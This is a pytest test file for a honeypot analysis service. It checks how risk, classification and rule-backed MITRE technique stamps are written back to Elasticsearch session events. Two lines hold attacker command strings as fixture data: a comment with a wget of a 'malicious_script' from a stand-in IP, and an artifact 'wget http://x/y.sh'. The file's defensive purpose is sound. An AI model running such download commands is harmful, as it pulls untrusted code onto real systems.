import pytest

from app.config import get_settings
from app.es.client import get_es
from app.seed.seeder import seed
from app.services.llm.schemas import EvidenceCitation
from app.services.mitre.mapper import MappedTechnique
from app.services.enrichment import write_back_enrichment

WGET_EVENT = "seed-botnet-01-008"  # wget http://198.51.100.7/malicious_script
UNAME_EVENT = "seed-botnet-01-004"  # uname -a
CONNECT_EVENT = "seed-botnet-01-000"  # cowrie.session.connect, not a command at all


async def _get_source(event_id: str) -> dict:
    doc = await get_es().get(index=get_settings().es_index, id=event_id)
    return doc["_source"]


def _rule_technique(event_id: str) -> MappedTechnique:
    return MappedTechnique(
        technique_id="T1105",
        technique_name="Ingress Tool Transfer",
        tactic="Command and Control",
        confidence=1.0,
        ai_explanation=None,
        source="rule",
        rule_id="T1105",
        observed=True,
        evidence=[EvidenceCitation(event_id=event_id, artifact="wget http://x/y.sh")],
    )


def _llm_technique(event_id: str) -> MappedTechnique:
    return MappedTechnique(
        technique_id="T1082",
        technique_name="System Information Discovery",
        tactic="Discovery",
        confidence=0.7,
        ai_explanation="Ran uname to fingerprint the host.",
        source="llm",
        rule_id=None,
        observed=False,
        evidence=[EvidenceCitation(event_id=event_id, artifact="uname -a")],
    )


def _rule_technique_uname(event_id: str) -> MappedTechnique:
    """A second RULE-backed technique (unlike `_llm_technique`, same event),
    used to prove a stale stamp is cleared when a later run no longer maps
    the event at all.
    """
    return MappedTechnique(
        technique_id="T1082",
        technique_name="System Information Discovery",
        tactic="Discovery",
        confidence=1.0,
        ai_explanation=None,
        source="rule",
        rule_id="T1082",
        observed=True,
        evidence=[EvidenceCitation(event_id=event_id, artifact="uname -a")],
    )


@pytest.mark.asyncio
async def test_write_back_stamps_risk_and_classification_on_every_session_event() -> None:
    """risk.* and ai_classification are a session-wide verdict: every event
    in the session gets them, whether or not it was ever cited by a
    technique -- the connect event included.
    """
    await seed(reset=True)
    await write_back_enrichment(
        session_id="seed-botnet-01",
        risk_score=87,
        risk="critical",
        classification="Automated botnet dropper",
        techniques=[],
    )

    wget_src = await _get_source(WGET_EVENT)
    connect_src = await _get_source(CONNECT_EVENT)

    for src in (wget_src, connect_src):
        assert src["risk"] == {"score": 87, "level": "critical"}
        assert src["ai_classification"] == "Automated botnet dropper"


@pytest.mark.asyncio
async def test_write_back_stamps_mitre_only_for_rule_backed_techniques() -> None:
    """mitre.technique_id/tactic must land on the event cited by a
    RULE-backed mapping, and must NOT land on an event cited only by an
    LLM-inferred mapping -- stamping an inference there would make a guess
    indistinguishable from something the honeypot actually observed.
    """
    await seed(reset=True)
    await write_back_enrichment(
        session_id="seed-botnet-01",
        risk_score=87,
        risk="critical",
        classification="Automated botnet dropper",
        techniques=[_rule_technique(WGET_EVENT), _llm_technique(UNAME_EVENT)],
    )

    wget_src = await _get_source(WGET_EVENT)
    uname_src = await _get_source(UNAME_EVENT)

    assert wget_src["mitre"] == {"technique_id": "T1105", "tactic": "Command and Control"}
    assert "mitre" not in uname_src


@pytest.mark.asyncio
async def test_write_back_does_not_touch_other_sessions() -> None:
    await seed(reset=True)
    before = await _get_source("seed-recon-01-000")
    assert "risk" not in before or before.get("ai_classification") is None

    await write_back_enrichment(
        session_id="seed-botnet-01",
        risk_score=87,
        risk="critical",
        classification="Automated botnet dropper",
        techniques=[_rule_technique(WGET_EVENT)],
    )

    after = await _get_source("seed-recon-01-000")
    assert after.get("ai_classification") is None


@pytest.mark.asyncio
async def test_write_back_clears_a_stale_mitre_stamp_on_reanalysis() -> None:
    """The write-back is authoritative for the session, not additive: a
    technique a PREVIOUS run mapped but this run doesn't must not survive
    as a stale mitre.* stamp indistinguishable from a current one.
    """
    await seed(reset=True)

    # First run: both wget->T1105 and uname->T1082 are rule-backed.
    await write_back_enrichment(
        session_id="seed-botnet-01",
        risk_score=87,
        risk="critical",
        classification="Automated botnet dropper",
        techniques=[_rule_technique(WGET_EVENT), _rule_technique_uname(UNAME_EVENT)],
    )
    before = await _get_source(UNAME_EVENT)
    assert before["mitre"] == {"technique_id": "T1082", "tactic": "Discovery"}

    # Re-analysis: only the wget rule fires this time (e.g. a rulebook
    # change, or the model this run just didn't map uname to anything).
    await write_back_enrichment(
        session_id="seed-botnet-01",
        risk_score=40,
        risk="medium",
        classification="Reconnaissance only",
        techniques=[_rule_technique(WGET_EVENT)],
    )

    after = await _get_source(UNAME_EVENT)
    assert "mitre" not in after, "a previous run's stamp must not survive a re-analysis that no longer maps it"

    wget_after = await _get_source(WGET_EVENT)
    assert wget_after["mitre"] == {"technique_id": "T1105", "tactic": "Command and Control"}
    assert wget_after["risk"] == {"score": 40, "level": "medium"}
    assert wget_after["ai_classification"] == "Reconnaissance only"


@pytest.mark.asyncio
async def test_write_back_with_zero_rule_backed_mappings_clears_mitre_but_keeps_risk() -> None:
    """An analysis that maps nothing via rules (only LLM inference, or
    nothing at all) must still write risk.*/ai_classification -- but must
    leave (or clear) mitre.* everywhere in the session, never an inference.
    """
    await seed(reset=True)

    await write_back_enrichment(
        session_id="seed-botnet-01",
        risk_score=87,
        risk="critical",
        classification="Automated botnet dropper",
        techniques=[_rule_technique(WGET_EVENT)],
    )
    assert (await _get_source(WGET_EVENT))["mitre"]["technique_id"] == "T1105"

    await write_back_enrichment(
        session_id="seed-botnet-01",
        risk_score=20,
        risk="low",
        classification="Unclassified",
        techniques=[_llm_technique(UNAME_EVENT)],  # LLM-only: zero rule hits
    )

    wget_after = await _get_source(WGET_EVENT)
    uname_after = await _get_source(UNAME_EVENT)
    assert "mitre" not in wget_after
    assert "mitre" not in uname_after
    assert wget_after["risk"] == {"score": 20, "level": "low"}
    assert wget_after["ai_classification"] == "Unclassified"


@pytest.mark.asyncio
async def test_write_back_failure_is_logged_and_does_not_raise(
    monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture
) -> None:
    """Enrichment is best-effort: a transient Elasticsearch failure must be
    logged loudly (an operator's signal that a session went un-enriched)
    but must never propagate out of write_back_enrichment -- Postgres
    already holds the durable, authoritative analysis by the time this
    runs, and run_analysis must still be able to return its id.
    """

    class ExplodingES:
        async def update_by_query(self, *args, **kwargs):  # noqa: ANN002, ANN003
            raise RuntimeError("elasticsearch unreachable")

    monkeypatch.setattr("app.services.enrichment.get_es", lambda: ExplodingES())

    with caplog.at_level("ERROR"):
        await write_back_enrichment(
            session_id="seed-botnet-01",
            risk_score=87,
            risk="critical",
            classification="Automated botnet dropper",
            techniques=[_rule_technique(WGET_EVENT)],
        )

    assert any(
        "enrichment write-back failed for session seed-botnet-01" in record.message
        for record in caplog.records
    )
    assert any(record.levelname == "ERROR" for record in caplog.records)
